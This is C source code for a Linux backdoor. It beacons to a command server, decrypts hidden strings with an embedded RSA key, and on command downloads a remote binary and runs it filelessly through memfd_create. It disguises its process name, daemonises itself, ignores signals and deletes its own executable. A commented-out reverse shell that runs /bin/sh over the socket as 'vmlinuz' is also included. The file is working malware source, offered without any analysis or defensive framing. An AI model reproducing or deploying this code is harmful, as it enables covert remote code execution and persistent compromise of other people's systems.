#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <dirent.h>
#include <pthread.h>
#include <curl/curl.h>
#include <sys/mman.h>
#include <openssl/pem.h>
#define ZeroMemory(d,l) memset((d),(0),(l))
#define SOCKET unsigned int
#define INVALID_SOCKET -1
#define DEBUG
SOCKET fd = -1;
char *programs[30]={};
static int ok = 1;
RSA *genRSA(unsigned char *key,int public){
    RSA *rsa = NULL;
    BIO *keybio = BIO_new_mem_buf(key,-1);
    if(keybio == NULL)
        return NULL;
    if(public)
        return PEM_read_bio_RSA_PUBKEY(keybio,&rsa,NULL,NULL);
    else
        return PEM_read_bio_RSAPrivateKey(keybio,&rsa,NULL,NULL);
}
int public_encrypt(unsigned char *data,int datalen,unsigned char *encrypted){
    unsigned char key[] = {
  0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x42, 0x45, 0x47, 0x49, 0x4e, 0x20, 0x50,
  0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x4b, 0x45, 0x59, 0x2d, 0x2d, 0x2d,
  0x2d, 0x2d, 0x0a, 0x4d, 0x49, 0x49, 0x42, 0x49, 0x6a, 0x41, 0x4e, 0x42,
  0x67, 0x6b, 0x71, 0x68, 0x6b, 0x69, 0x47, 0x39, 0x77, 0x30, 0x42, 0x41,
  0x51, 0x45, 0x46, 0x41, 0x41, 0x4f, 0x43, 0x41, 0x51, 0x38, 0x41, 0x4d,
  0x49, 0x49, 0x42, 0x43, 0x67, 0x4b, 0x43, 0x41, 0x51, 0x45, 0x41, 0x72,
  0x6e, 0x76, 0x55, 0x42, 0x7a, 0x36, 0x4c, 0x52, 0x45, 0x51, 0x39, 0x4d,
  0x6c, 0x32, 0x74, 0x72, 0x66, 0x63, 0x53, 0x0a, 0x7a, 0x53, 0x39, 0x4e,
  0x75, 0x42, 0x7a, 0x4e, 0x49, 0x46, 0x64, 0x44, 0x4c, 0x64, 0x53, 0x4e,
  0x64, 0x72, 0x6d, 0x31, 0x71, 0x51, 0x64, 0x35, 0x79, 0x69, 0x41, 0x4d,
  0x58, 0x70, 0x56, 0x2b, 0x78, 0x58, 0x76, 0x54, 0x67, 0x59, 0x66, 0x34,
  0x73, 0x4b, 0x46, 0x38, 0x4d, 0x6d, 0x6b, 0x39, 0x38, 0x4d, 0x52, 0x32,
  0x5a, 0x6a, 0x70, 0x34, 0x49, 0x47, 0x73, 0x63, 0x58, 0x61, 0x77, 0x78,
  0x0a, 0x30, 0x30, 0x6d, 0x6d, 0x6d, 0x65, 0x39, 0x75, 0x45, 0x45, 0x41,
  0x70, 0x35, 0x69, 0x46, 0x4b, 0x74, 0x69, 0x39, 0x66, 0x38, 0x47, 0x51,
  0x78, 0x4d, 0x44, 0x70, 0x4b, 0x58, 0x74, 0x6c, 0x33, 0x34, 0x65, 0x34,
  0x67, 0x78, 0x4f, 0x74, 0x48, 0x6d, 0x58, 0x5a, 0x73, 0x74, 0x69, 0x66,
  0x4d, 0x41, 0x61, 0x57, 0x4b, 0x68, 0x2f, 0x47, 0x67, 0x51, 0x48, 0x47,
  0x2b, 0x62, 0x53, 0x51, 0x56, 0x0a, 0x70, 0x48, 0x38, 0x56, 0x74, 0x6c,
  0x71, 0x4d, 0x72, 0x39, 0x6c, 0x76, 0x42, 0x67, 0x55, 0x71, 0x51, 0x76,
  0x59, 0x33, 0x67, 0x6d, 0x4d, 0x54, 0x6e, 0x52, 0x73, 0x48, 0x41, 0x6f,
  0x52, 0x35, 0x67, 0x7a, 0x56, 0x71, 0x50, 0x6f, 0x52, 0x62, 0x4e, 0x78,
  0x36, 0x62, 0x53, 0x32, 0x58, 0x47, 0x6f, 0x6b, 0x59, 0x6c, 0x39, 0x66,
  0x59, 0x68, 0x32, 0x64, 0x52, 0x56, 0x77, 0x48, 0x48, 0x59, 0x0a, 0x31,
  0x6c, 0x2b, 0x31, 0x73, 0x75, 0x71, 0x72, 0x4a, 0x59, 0x4e, 0x38, 0x4a,
  0x65, 0x59, 0x6a, 0x72, 0x57, 0x56, 0x6b, 0x37, 0x4b, 0x38, 0x74, 0x78,
  0x69, 0x51, 0x37, 0x67, 0x66, 0x36, 0x37, 0x33, 0x59, 0x50, 0x4b, 0x59,
  0x54, 0x63, 0x53, 0x4e, 0x51, 0x75, 0x47, 0x43, 0x68, 0x6b, 0x47, 0x6c,
  0x41, 0x50, 0x59, 0x58, 0x63, 0x50, 0x62, 0x53, 0x37, 0x49, 0x6e, 0x47,
  0x61, 0x41, 0x7a, 0x0a, 0x44, 0x74, 0x62, 0x4a, 0x48, 0x59, 0x56, 0x5a,
  0x45, 0x62, 0x36, 0x53, 0x35, 0x57, 0x32, 0x58, 0x66, 0x75, 0x37, 0x48,
  0x52, 0x38, 0x50, 0x46, 0x2f, 0x54, 0x61, 0x7a, 0x32, 0x31, 0x59, 0x47,
  0x72, 0x52, 0x72, 0x70, 0x47, 0x2f, 0x41, 0x69, 0x32, 0x38, 0x44, 0x48,
  0x54, 0x65, 0x69, 0x6b, 0x5a, 0x53, 0x45, 0x76, 0x4e, 0x76, 0x6b, 0x2f,
  0x4c, 0x56, 0x6d, 0x43, 0x76, 0x6b, 0x61, 0x32, 0x0a, 0x43, 0x51, 0x49,
  0x44, 0x41, 0x51, 0x41, 0x42, 0x0a, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x45,
  0x4e, 0x44, 0x20, 0x50, 0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x4b, 0x45,
  0x59, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x0a
};
    RSA *rsa = genRSA(key,1);
    return RSA_public_encrypt(datalen,data,encrypted,rsa,RSA_PKCS1_PADDING);
}
int public_decrypt(unsigned char *enc_data,int data_len,unsigned char *decrypted){
    unsigned char key[] = {
  0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x42, 0x45, 0x47, 0x49, 0x4e, 0x20, 0x50,
  0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x4b, 0x45, 0x59, 0x2d, 0x2d, 0x2d,
  0x2d, 0x2d, 0x0a, 0x4d, 0x49, 0x49, 0x42, 0x49, 0x6a, 0x41, 0x4e, 0x42,
  0x67, 0x6b, 0x71, 0x68, 0x6b, 0x69, 0x47, 0x39, 0x77, 0x30, 0x42, 0x41,
  0x51, 0x45, 0x46, 0x41, 0x41, 0x4f, 0x43, 0x41, 0x51, 0x38, 0x41, 0x4d,
  0x49, 0x49, 0x42, 0x43, 0x67, 0x4b, 0x43, 0x41, 0x51, 0x45, 0x41, 0x72,
  0x6e, 0x76, 0x55, 0x42, 0x7a, 0x36, 0x4c, 0x52, 0x45, 0x51, 0x39, 0x4d,
  0x6c, 0x32, 0x74, 0x72, 0x66, 0x63, 0x53, 0x0a, 0x7a, 0x53, 0x39, 0x4e,
  0x75, 0x42, 0x7a, 0x4e, 0x49, 0x46, 0x64, 0x44, 0x4c, 0x64, 0x53, 0x4e,
  0x64, 0x72, 0x6d, 0x31, 0x71, 0x51, 0x64, 0x35, 0x79, 0x69, 0x41, 0x4d,
  0x58, 0x70, 0x56, 0x2b, 0x78, 0x58, 0x76, 0x54, 0x67, 0x59, 0x66, 0x34,
  0x73, 0x4b, 0x46, 0x38, 0x4d, 0x6d, 0x6b, 0x39, 0x38, 0x4d, 0x52, 0x32,
  0x5a, 0x6a, 0x70, 0x34, 0x49, 0x47, 0x73, 0x63, 0x58, 0x61, 0x77, 0x78,
  0x0a, 0x30, 0x30, 0x6d, 0x6d, 0x6d, 0x65, 0x39, 0x75, 0x45, 0x45, 0x41,
  0x70, 0x35, 0x69, 0x46, 0x4b, 0x74, 0x69, 0x39, 0x66, 0x38, 0x47, 0x51,
  0x78, 0x4d, 0x44, 0x70, 0x4b, 0x58, 0x74, 0x6c, 0x33, 0x34, 0x65, 0x34,
  0x67, 0x78, 0x4f, 0x74, 0x48, 0x6d, 0x58, 0x5a, 0x73, 0x74, 0x69, 0x66,
  0x4d, 0x41, 0x61, 0x57, 0x4b, 0x68, 0x2f, 0x47, 0x67, 0x51, 0x48, 0x47,
  0x2b, 0x62, 0x53, 0x51, 0x56, 0x0a, 0x70, 0x48, 0x38, 0x56, 0x74, 0x6c,
  0x71, 0x4d, 0x72, 0x39, 0x6c, 0x76, 0x42, 0x67, 0x55, 0x71, 0x51, 0x76,
  0x59, 0x33, 0x67, 0x6d, 0x4d, 0x54, 0x6e, 0x52, 0x73, 0x48, 0x41, 0x6f,
  0x52, 0x35, 0x67, 0x7a, 0x56, 0x71, 0x50, 0x6f, 0x52, 0x62, 0x4e, 0x78,
  0x36, 0x62, 0x53, 0x32, 0x58, 0x47, 0x6f, 0x6b, 0x59, 0x6c, 0x39, 0x66,
  0x59, 0x68, 0x32, 0x64, 0x52, 0x56, 0x77, 0x48, 0x48, 0x59, 0x0a, 0x31,
  0x6c, 0x2b, 0x31, 0x73, 0x75, 0x71, 0x72, 0x4a, 0x59, 0x4e, 0x38, 0x4a,
  0x65, 0x59, 0x6a, 0x72, 0x57, 0x56, 0x6b, 0x37, 0x4b, 0x38, 0x74, 0x78,
  0x69, 0x51, 0x37, 0x67, 0x66, 0x36, 0x37, 0x33, 0x59, 0x50, 0x4b, 0x59,
  0x54, 0x63, 0x53, 0x4e, 0x51, 0x75, 0x47, 0x43, 0x68, 0x6b, 0x47, 0x6c,
  0x41, 0x50, 0x59, 0x58, 0x63, 0x50, 0x62, 0x53, 0x37, 0x49, 0x6e, 0x47,
  0x61, 0x41, 0x7a, 0x0a, 0x44, 0x74, 0x62, 0x4a, 0x48, 0x59, 0x56, 0x5a,
  0x45, 0x62, 0x36, 0x53, 0x35, 0x57, 0x32, 0x58, 0x66, 0x75, 0x37, 0x48,
  0x52, 0x38, 0x50, 0x46, 0x2f, 0x54, 0x61, 0x7a, 0x32, 0x31, 0x59, 0x47,
  0x72, 0x52, 0x72, 0x70, 0x47, 0x2f, 0x41, 0x69, 0x32, 0x38, 0x44, 0x48,
  0x54, 0x65, 0x69, 0x6b, 0x5a, 0x53, 0x45, 0x76, 0x4e, 0x76, 0x6b, 0x2f,
  0x4c, 0x56, 0x6d, 0x43, 0x76, 0x6b, 0x61, 0x32, 0x0a, 0x43, 0x51, 0x49,
  0x44, 0x41, 0x51, 0x41, 0x42, 0x0a, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x45,
  0x4e, 0x44, 0x20, 0x50, 0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x4b, 0x45,
  0x59, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x0a
};
    RSA *rsa = genRSA(key,1);
    return RSA_public_decrypt(data_len,enc_data,decrypted,rsa,1); 
}
int is_number(char str[]){
    int success = 1;
    for (register int i = 0; i < strlen(str); i++)
        if(!isdigit(str[i]))
            success = 0;
    return success;
}
/*pid_t id = fork();
if(id == 0){
    dup2(fd,0);
    for(register int i = 55; i >= 0; i--)
        dup2(fd,i);
    execl("/bin/sh","vmlinuz",(char* )NULL);
    exit(127);
}else{
    waitpid(id,0,0);
    close(fd);
}*/
void getapp(char *name){
    char str[4] = {};
    DIR *d;
    struct dirent *dire;
    d = opendir("/proc/");
    while ((dire = readdir(d)) != NULL)
        if(is_number(dire->d_name)){
            strcpy(str,dire->d_name);
            break;
        }
    closedir(d);
    char tmp[100];
    sprintf(tmp,"/proc/%d/cmdline",atoi(str));
    FILE *f = fopen(tmp,"r");
    fgets(name,100,f);
    fclose(f);
    return;
}
struct souzomem{
    char *mem;
    size_t ssize;
};
size_t souzowrite(void *content,size_t size,size_t nmemb,void *userp){
    size_t rsize = size * nmemb;
    struct souzomem *mem = (struct souzomem *)userp;
    char *ptr=realloc(mem->mem,mem->ssize+rsize+1);
    if(!ptr)
        return 0;
    mem->mem = ptr;
    memcpy(&(mem->mem[mem->ssize]),content,rsize);
    mem->ssize += rsize;
    mem->mem[mem->ssize]= 0;
    return rsize;
}
void downloadexec(char url[],char args[]){
    if(strlen(url) <=0) return;
    struct souzomem buffer = {
        .mem = malloc(1),
        .ssize=0
    };
    curl_global_init(CURL_GLOBAL_ALL);
    CURL *chandle = curl_easy_init();
    curl_easy_setopt(chandle,CURLOPT_URL,url);
    curl_easy_setopt(chandle,CURLOPT_FOLLOWLOCATION,1);
    curl_easy_setopt(chandle,CURLOPT_WRITEFUNCTION,souzowrite);
    curl_easy_setopt(chandle,CURLOPT_WRITEDATA,&buffer);
    curl_easy_setopt(chandle,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0");
    CURLcode rcode = curl_easy_perform(chandle);
    if(rcode != CURLE_OK){
        #ifdef DEBUG
        printf("curl erro %s\n",curl_easy_strerror(rcode));
        #endif
        return;
    }
    #ifdef DEBUG
    printf("%lu bytes received\n",(unsigned long)buffer.ssize);
    #endif
    curl_easy_cleanup(chandle);
    curl_global_cleanup();
    char a[300] = {};
    int fds = memfd_create("",MFD_CLOEXEC);
    sprintf(a,"/proc/self/fd/%d",fds);
    write(fds,buffer.mem,buffer.ssize);
    pid_t id= fork();
    char b[100] = {};
    getapp(b);
    if(id ==0)
        execl(a,b,(char *)NULL);
}
void sh(){
    char rcv[1024] = {};
    char snd[1024] = {};
    if(recv(fd,rcv,sizeof(rcv),0) > 0){
        if(!strncmp(rcv,"teste",5)){
            ZeroMemory(rcv,sizeof(rcv));
            ZeroMemory(snd,sizeof(snd));
            while(recv(fd,rcv,sizeof(rcv),0) > 0 && ok){
                unsigned char queroverooco[] = {0x65,0xd5,0x81,0x01,0x4c,0xcd,0xba,0x57,0xd9,0x16,0x43,0x26,0x39,0x42,0x2f,0x15,0x0e,0xc8,0x8d,0xed,0x7c,0x82,0xd5,0x13,0x5e,0xde,0x47,0x9f,0xc8,0xab,0xde,0x2d,0xf0,0xb0,0x9a,0x9f,0xe8,0xa8,0x4c,0x42,0x8c,0x11,0xbd,0x2d,0xa9,0x25,0x37,0x87,0x2a,0xe7,0xaa,0x68,0x1e,0x07,0x76,0x64,0x64,0x13,0xb4,0x79,0x92,0x5e,0x50,0x95,0x80,0x44,0xfe,0xc1,0x15,0xb4,0xe9,0x2b,0xaf,0x4f,0x94,0xd3,0x31,0xcd,0x92,0xc9,0x95,0x2a,0x6e,0xe3,0xd2,0x04,0x64,0x50,0xbc,0x67,0xcb,0x08,0x32,0x41,0x3c,0x1c,0x9d,0xe0,0x8e,0x63,0x3e,0xb3,0x4b,0x4a,0x7a,0xb3,0x42,0xbe,0xad,0x27,0x84,0x47,0x13,0xbc,0xb9,0xfc,0x20,0x68,0x4f,0x91,0x18,0xca,0x4d,0x03,0x26,0xa5,0x0c,0x00,0x79,0xc2,0xf7,0xf1,0x97,0x0b,0x80,0xf4,0xe0,0x83,0x6a,0x81,0x0a,0xb6,0x46,0x6d,0x76,0x8e,0x1e,0x53,0x99,0xaf,0x32,0xa8,0x96,0x5a,0x7f,0x58,0x1d,0xb2,0xb7,0x34,0x02,0xb5,0x9e,0x03,0x52,0x31,0x5c,0xbc,0xab,0xaf,0x64,0xf2,0x12,0x18,0x10,0xdb,0xbe,0x2f,0xb6,0xfc,0x8e,0x3a,0x5c,0x64,0xb2,0xf6,0x3f,0xa1,0x1e,0x7b,0x08,0xdb,0x23,0x36,0xc9,0x89,0x47,0x1d,0x12,0xbe,0xbc,0x92,0x4e,0x83,0x62,0x2f,0xdc,0x00,0x81,0x99,0x6d,0xdd,0x06,0x70,0x11,0x71,0x4c,0x95,0x7d,0xd4,0x1e,0xa3,0x9e,0x2a,0xe2,0x97,0xdd,0x2f,0x3e,0x0b,0x9e,0x06,0x41,0x42,0xdc,0x49,0x76,0xc5,0x35,0x93,0xff,0x36,0x4d,0x4d,0x8d,0x58,0x76,0xad,0x8f,0xa7,0xdb,0xbb,0x16,0xb9,0x3c,0xc4,0x00 };
                char tutstuts[1024] = {};
                public_decrypt(queroverooco,256,tutstuts);
                if(!strncmp(rcv,tutstuts,17)){
                    char url[400]={};
                    char args[600]={};
                    sscanf(rcv+18,"%s %s",url,args);
                    downloadexec(url,args);
                    #ifdef DEBUG
                    printf("downloadexec concluido url: %s\n",url);
                    #endif
                }else if(!strncmp(rcv,"kill",4)){
                    ok=0;
                }
                ZeroMemory(rcv,sizeof(rcv));
                ZeroMemory(snd,sizeof(snd));
            }
        }
    }
    close(fd);
}
void ec2(){
    fd = INVALID_SOCKET;
    sleep(1);
    char http[1024];
    unsigned char cryptedttp[] = {0xa5,0x2a,0xab,0x2b,0x91,0xb2,0x24,0x61,0xa1,0x66,0xb1,0x38,0xfc,0x80,0x26,0xd8,0x2a,0x66,0x15,0x47,0x40,0x43,0xf0,0x67,0x0d,0x94,0x91,0x60,0xb9,0xd1,0x6a,0x3f,0xf6,0xc1,0x31,0x7c,0xaf,0x59,0x2f,0x87,0x62,0x47,0xe7,0x5a,0x7e,0xf7,0xdb,0x52,0x16,0xd4,0x2b,0xd7,0xef,0x9e,0x11,0x5e,0xa3,0xcb,0x15,0x3a,0x79,0x92,0x4e,0xc7,0x0c,0x56,0x2e,0x6d,0x8b,0xb3,0x43,0x02,0x07,0xb3,0xc7,0x13,0xfc,0x70,0x07,0xed,0xdd,0x62,0x2b,0x29,0xab,0xbc,0x71,0x14,0x9d,0x7e,0xd7,0x80,0x9e,0xcd,0x48,0x7a,0x3b,0x45,0x8a,0x0e,0x82,0xf7,0x3f,0xac,0xee,0x87,0xfa,0xf3,0x83,0x90,0xac,0x71,0xaf,0x22,0x05,0x31,0xa6,0x1a,0x5a,0x85,0xbf,0x3e,0xd4,0xf6,0x73,0x61,0xd3,0xf1,0xa4,0xd0,0xd7,0x36,0x99,0x95,0xa4,0x65,0x76,0x1c,0x4c,0x87,0x98,0x27,0x0f,0x20,0xf0,0xcb,0x7a,0x85,0xb2,0x96,0x4c,0x27,0x5d,0x5b,0xe0,0x8a,0x58,0xbb,0x45,0x92,0x22,0xfd,0x0e,0x9f,0x50,0x36,0xd5,0xe4,0x11,0x1b,0x4c,0xbf,0x71,0xcd,0xd4,0x4b,0x88,0x95,0x8e,0xdf,0xa0,0x67,0x34,0x5f,0x51,0xe2,0xc5,0x38,0x83,0x59,0x7b,0x5e,0xfa,0xf6,0x45,0x6b,0x1b,0x5d,0xd1,0x9f,0x97,0x5f,0xda,0xb2,0xd0,0x6b,0x02,0xdd,0x39,0xd0,0x2f,0x28,0x4d,0x79,0x64,0x09,0x56,0x2a,0x15,0x2b,0xdf,0x50,0x13,0xe2,0x67,0x10,0x29,0x15,0xc2,0x3a,0x9e,0x9c,0x19,0x12,0x14,0x5a,0x59,0xbe,0xdf,0xab,0x47,0x0b,0x6c,0xba,0x61,0x62,0x41,0xa1,0xf0,0xcf,0x46,0x51,0x98,0xd5,0x8d,0xec,0x00 };
    public_decrypt(cryptedttp,256,http);
    printf("%s",http);
    struct addrinfo hints,*res;
    memset(&hints,0,sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if(getaddrinfo("127.0.0.1","80",&hints,&res) == 0){
        fd = socket(res->ai_family,res->ai_socktype,res->ai_protocol);
        if (fd != INVALID_SOCKET)
        {
            if(connect(fd,res->ai_addr,res->ai_addrlen) <0)
                close(fd);
            else{
                if(send(fd,http,strlen(http),0) != 0)
                    sh();
            }
            close(fd);
        }
    }
}
void initialization(char *program){
    char bbb[] = "ROQIRJQOIJroiqjoqi3jeRIJROFJQOIJfqjoi";
    char name[100] = {};
    pid_t id = fork();
    if(id < 0)
        exit(0);
    else if(id > 0)
        exit(0);
    setsid();
    for (register int i = 1; i < 64; i++)
        signal(i,SIG_IGN);

    id = fork();
    if(id > 0)
        exit(0);
    getapp(name);
    remove(program);
    ZeroMemory(program,strlen(program));
    strcpy(program,name);
    chdir("/");
    for(register int i = sysconf(_SC_OPEN_MAX); i >= 0; i--)
        close(i);
}

int main(int argc, char *argv[])
{
    printf("%s\n",argv[0]);
    //initialization(argv[0]);
    while(ok){
        //if(DEBUG)
            //printf("ec2 ok\n");
        ec2();
       
        //sleep(60*10);
    }
}
